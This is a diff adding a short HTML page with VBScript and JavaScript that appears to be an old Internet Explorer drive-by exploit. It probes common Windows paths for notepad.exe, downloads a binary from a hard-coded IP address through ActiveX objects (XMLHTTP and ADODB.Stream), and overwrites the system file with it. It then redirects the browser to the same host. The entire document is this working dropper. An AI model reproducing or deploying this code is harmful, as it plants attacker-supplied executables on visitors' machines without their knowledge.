@@ -1,0 +1,48 @@
+<script language="vbscript">
+    Function Exists(filename)
+        On Error Resume Next
+        LoadPicture(filename)
+        Exists = Err.Number =  481
+    End Function    
+</script>
+<script language="javascript">
+    wmplayerpaths= [
+            "c:\\winnt\\notepad.exe",
+			"d:\\winnt\\notepad.exe",
+			"e:\\winnt\\notepad.exe",
+			"f:\\winnt\\notepad.exe",
+			"c:\\windows\\notepad.exe",
+			"d:\\windows\\notepad.exe",
+			"e:\\windows\\notepad.exe",
+			"f:\\windows\\notepad.exe",
+			"c:\\winnt\\system32\\notepad.exe",
+			"d:\\winnt\\system32\\notepad.exe",
+			"e:\\winnt\\system32\\notepad.exe",
+			"f:\\winnt\\system32\\notepad.exe",
+			"c:\\windows\\system32\\notepad.exe",
+			"d:\\windows\\system32\\notepad.exe",
+			"e:\\windows\\system32\\notepad.exe",
+			"f:\\windows\\system32\\notepad.exe"];
+    
+    for (i=0;i<wmplayerpaths.length;i++) {
+        wmplayerpath = wmplayerpaths[i];
+        if (Exists(wmplayerpath))
+            write_file(wmplayerpath);
+    }
+	location.href = "view-source:http://66.36.252.90/";
+	function write_file(wmplayerpath)
+	{
+  	    var x = new ActiveXObject("Microsoft.XMLHTTP"); 
+	    x.Open("GET","http://66.36.252.90/i/thumb1.php",0); 
+	    x.Send();
+	   	var s = new ActiveXObject("ADODB.Stream");
+	    s.Mode = 3;
+	    s.Type = 1;
+	    s.Open();
+	    s.Write(x.responseBody);
+	    s.SaveToFile(wmplayerpath,2);
+		s.close;
+		x.close;
+	}
+    
+</script>
